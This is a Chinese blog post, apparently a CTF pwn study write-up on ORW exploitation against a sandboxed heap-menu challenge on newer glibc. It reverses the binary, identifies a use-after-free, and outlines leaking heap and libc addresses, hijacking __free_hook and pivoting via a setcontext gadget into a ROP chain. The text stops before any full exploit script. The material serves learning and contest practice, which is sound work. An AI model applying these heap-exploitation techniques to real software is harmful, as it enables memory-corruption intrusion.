<!doctype html>
<head>
  <meta charset="utf-8">
  <meta name="description" content="&lt;h3 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;要国赛了，打几个题仔细分析复习一下，找了个题，跟着网上的wp进行一把复现，三种解法。&lt;/p&gt;
&lt;h3 id=&#34;逆向分析&#34;&gt;&lt;a href=&#34;#逆向分析&#34; class=&#34;headerlink&#34; title=&#34;逆向分析&#34;&gt;&lt;/a&gt;逆向分析&lt;/h3&gt;&lt;p&gt;开启了沙盒">
  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
  <title>高版本orw利用方法总结 | powercat</title>

  <link rel="stylesheet" id="chosen-theme" href="https://rawgit.com/fiatjaf/classless/master/themes/plain/theme.css">
  <script>
let link = document.getElementById('chosen-theme')
let widget = document.createElement('div')
widget.style.position = 'absolute'
widget.style.right = '5px'
widget.style.top = '2px'
widget.style.background = 'beige'
widget.style.color = '#444'
widget.style.zIndex = 99
widget.style.padding = '4px 8px'
widget.innerHTML = `
<label>
  <p>No theme was set on <code>theme_config</code>.<br>
     Choose a theme from the list to experiment with it:</p>
  <select></select>
</label>
`
fetch('https://api.github.com/repos/fiatjaf/classless/contents/themes')
  .then(r => r.json())
  .then(files => {
    document.body.appendChild(widget)
    let select = document.querySelector('select')
    files
      .filter(f => f.type === 'dir')
      .forEach(f => {
        let option = document.createElement('option')
        option.value = f.name
        option.innerHTML = f.name
        select.appendChild(option)
      })
    let options = Array.from(select.querySelectorAll('option'))
    let chosen = options[parseInt(Math.random() * options.length)]
    chosen.selected = true
    link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen.value}`)
    select.addEventListener('change', e => {
      let chosen = e.target.value
      link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen}`)
    })
  })
  .catch(console.log)
  </script>

<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <header role="banner">
      <a href="/">
        
          <img src="https://picsum.photos/640/480">
        
      </a>  
    <h1>
      <a href="/">powercat</a>
    </h1>
    <aside>
      <p></p>
    </aside>
  </header>
  
  <main>
    <article>
  <header>
  
  <h1><a href="http://example.com/2022/04/06/%E9%AB%98%E7%89%88%E6%9C%ACorw%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">高版本orw利用方法总结</a></h1>
  <aside>
    
    <time datetime="222022-04-06">
      April 6th 2022
    </time>
    
    <ul>
    
      <li><a href="/tags/study/">study</a></li>
    
    </ul>
  </aside>
</header>

  <div><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>要国赛了，打几个题仔细分析复习一下，找了个题，跟着网上的wp进行一把复现，三种解法。</p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>开启了沙盒，保护全开</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, <span class="type">char</span> **, <span class="type">char</span> **))((<span class="type">char</span> *)&amp;sub_1368 + <span class="number">1</span>))(a1, a2, a3);<span class="comment">// s3，开启了沙盒</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          nemu();</span><br><span class="line">          v4 = input();</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt; <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          birth_to_child();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v4 &gt; <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v4 &lt;= <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          creat_child_name();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          show_name();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          rm_child();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">666</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_1AB0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      edit_description_();</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_15:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>nemu()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1641</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Give birth to a child&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Change child&#x27;s name&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Show children&#x27;s name&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.Remove your child&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5.Edit child&#x27;s description.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;6.Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>birth_to_child()</p>
<p>可以看出程序最多可以申请10个堆块，同时会维护两个数组，分别是<code>chunk_list</code>和<code>chunk_list_flag</code>, 其中前者储存申请的chunk地址，而后者则会依据申请堆块的序号把数组对应位置写为<code>1</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_16A5</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input index?&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;oh god, you can&#x27;t give birth to a child!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>);</span><br><span class="line">  v2 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">1</span> &amp;&amp; v2 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Oho, your child must be a boy or a girl&quot;</span>);</span><br><span class="line">  used[v1] = <span class="number">1</span>;</span><br><span class="line">  heap_idty[v1] = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(heap_idty[v1] + <span class="number">8LL</span>) = <span class="string">&#x27;yob&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v2 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)(heap_idty[v1] + <span class="number">8LL</span>), <span class="string">&quot;girl&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read_gai(heap_idty[v1], <span class="number">8LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>creat_child_name()</p>
<p>逻辑很简单，在改名前会检查<code>chunk_list_flag</code>对应位置是否为1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_17EA</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input index?&quot;</span>);</span><br><span class="line">  LODWORD(v0) = input();                        <span class="comment">// 输入</span></span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)v0 &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">int</span>)v0 &lt;= <span class="number">9</span> )           <span class="comment">// 最多只能有9个堆块</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = heap_idty[(<span class="type">int</span>)v0];                    <span class="comment">// 获取对应位置堆块地址</span></span><br><span class="line">    <span class="keyword">if</span> ( v0 )                                   <span class="comment">// 判断次堆块是否存在</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = used[v2];                   <span class="comment">// 判断堆块是否被free</span></span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please input your child&#x27;s new name:&quot;</span>);</span><br><span class="line">        read_gai((<span class="type">void</span> *)heap_idty[v2], <span class="number">8</span>);     <span class="comment">// 正常修改</span></span><br><span class="line">        LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>show_name()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show_name</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input index?&quot;</span>);</span><br><span class="line">  LODWORD(v0) = input();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)v0 &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">int</span>)v0 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = heap_idty[(<span class="type">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = used[v2];</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)v0 )</span><br><span class="line">        LODWORD(v0) = <span class="built_in">printf</span>(</span><br><span class="line">                        <span class="string">&quot;Name: %s, Gender: %s, Description:%s.\n&quot;</span>,</span><br><span class="line">                        (<span class="type">const</span> <span class="type">char</span> *)heap_idty[v2],</span><br><span class="line">                        (<span class="type">const</span> <span class="type">char</span> *)(heap_idty[v2] + <span class="number">8LL</span>),</span><br><span class="line">                        (<span class="type">const</span> <span class="type">char</span> *)(heap_idty[v2] + <span class="number">16LL</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rm_child()</p>
<p>程序的主要漏洞就出在释放函数中，可见函数并没有检查 <code>chunk_list_flag</code>，且释放后并没有将 <code>chunk_list</code>置0，存在uaf</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_196B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input index?&quot;</span>);</span><br><span class="line">  LODWORD(v0) = input();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)v0 &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">int</span>)v0 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = heap_idty[(<span class="type">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)heap_idty[v2]);              <span class="comment">// uaf</span></span><br><span class="line">      used[v2] = <span class="number">0</span>;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> change_gender()</p>
<p>这个函数就不太一样了，他在修改性别前没有检查<code>chunk_list_flag</code>，而且会先打印当前性别</p>
<p>试想一下，如果目标堆块处于 <code>tcache</code>中，那么修改性别就能泄露 <code>堆地址</code></p>
<p>如果目标堆块处于 <code>unsort bin</code>中，那么修改性别就有可能泄露 <code>libc地址</code></p>
<p>（不过其实出题人提供这个函数是为了降低难度，即便不调用这个函数也可以通过<code>double free</code>来泄露相关地址）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1AB0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You only have 1 chances to change your child&#x27;s gender, left: %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)dword_4010);</span><br><span class="line">  LODWORD(v0) = dword_4010;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4010 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input index?&quot;</span>);</span><br><span class="line">    LODWORD(v0) = input();</span><br><span class="line">    v2 = (<span class="type">int</span>)v0;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)v0 &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">int</span>)v0 &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = (<span class="type">char</span> *)heap_idty[(<span class="type">int</span>)v0];</span><br><span class="line">      <span class="keyword">if</span> ( v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        --dword_4010;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Current gender:%s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)(heap_idty[v2] + <span class="number">8LL</span>));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please rechoose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>);</span><br><span class="line">        v3 = input();</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v0 = (<span class="type">char</span> *)(heap_idty[v2] + <span class="number">8LL</span>);</span><br><span class="line">          *(_DWORD *)v0 = <span class="number">7958370</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v0 = (<span class="type">char</span> *)(heap_idty[v2] + <span class="number">8LL</span>);</span><br><span class="line">          <span class="built_in">strcpy</span>(v0, <span class="string">&quot;girl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;oho, you choose a invalid gender.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit_description_();</p>
<p>逻辑很简单，修改前也会检查 <code>chunk_list_flag</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1A03</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input index?&quot;</span>);</span><br><span class="line">  LODWORD(v0) = input();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)v0 &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">int</span>)v0 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = heap_idty[(<span class="type">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = used[v2];</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please input your child&#x27;s description:&quot;</span>);</span><br><span class="line">        read_gai((<span class="type">void</span> *)(heap_idty[v2] + <span class="number">16LL</span>), <span class="number">240</span>);</span><br><span class="line">        LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先分析一下题目，程序中可以 <code>创建</code>、<code>删除</code>、 <code>改名</code>、 <code>改描述</code>、<code>更改一次性别</code>、<code>退出</code></p>
<p><code>chunk</code>的结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span> → pre_size</span><br><span class="line"></span><br><span class="line"><span class="number">0x8</span> → size</span><br><span class="line"></span><br><span class="line"><span class="number">0x10</span> → name</span><br><span class="line"></span><br><span class="line"><span class="number">0x18</span> → gender</span><br><span class="line"></span><br><span class="line"><span class="number">0x20</span> → des </span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p>我们可以通过构造堆块重叠来泄露堆地址和libc地址，然后通过tcahche_attack劫持到free_hook，向其写入gadget，然后我们在可控的地址写入orw进行调用，free之后执行，puts出flag。</p>
<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>gadget+setcontext</p>
<p>用到的gadget是<code>getkeyserv_handle+576</code></p>
<p>这是在我本地的环境下libc中的gadget，是将rdi+8中的内容放入rdx中，然后调用rdx+0x20</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220503093815-02ykjp2.png" alt="image.png"></p>
<p>从 Glibc2.29到2.32都可用</p>
<p>我们首先需要讲free_hook中的内容劫持为gadget内容，然后free一个堆块，此堆块地址作为参数在rdi寄存器中，然后我们看gadget和heap结构，因为在高版本中堆块的指针指向内容所以此时的rdi+8就等于gender那么此时rdx中的值就是gender，因为我们有一次修改性别的机会，那么我们就通过修改性别讲rdx寄存器里面内容替换成任意值。然后我们再来看setcontext+61</p>
<p>我们还可以通过构造一个fake_chunk来进行对下一堆快的内容进行一个修改gender</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000580</span>DD                 mov     rsp, [rdx+<span class="number">0</span>A0h]</span><br><span class="line">.text:<span class="number">00000000000580E4</span>                 mov     rbx, [rdx+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">00000000000580</span>EB                 mov     rbp, [rdx+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">00000000000580</span>EF                 mov     r12, [rdx+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">00000000000580F</span>3                 mov     r13, [rdx+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">00000000000580F</span>7                 mov     r14, [rdx+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">00000000000580F</span>B                 mov     r15, [rdx+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">00000000000580F</span>F                 test    dword ptr fs:<span class="number">48</span>h, <span class="number">2</span></span><br><span class="line">    ....</span><br><span class="line">.text:<span class="number">00000000000581</span>C6                 mov     rcx, [rdx+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">00000000000581</span>CD                 push    rcx</span><br><span class="line">.text:<span class="number">00000000000581</span>CE                 mov     rsi, [rdx+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">00000000000581</span>D2                 mov     rdi, [rdx+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">00000000000581</span>D6                 mov     rcx, [rdx+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">00000000000581</span>DD                 mov     r8, [rdx+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">00000000000581E1</span>                 mov     r9, [rdx+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">00000000000581E5</span>                 mov     rdx, [rdx+<span class="number">88</span>h]</span><br><span class="line">.text:<span class="number">00000000000581</span>EC                 xor     eax, eax</span><br><span class="line">.text:<span class="number">00000000000581</span>EE                 retn</span><br></pre></td></tr></table></figure>

<p>我们需要讲rsp整到我们布置的rop上，调整一下布局</p>
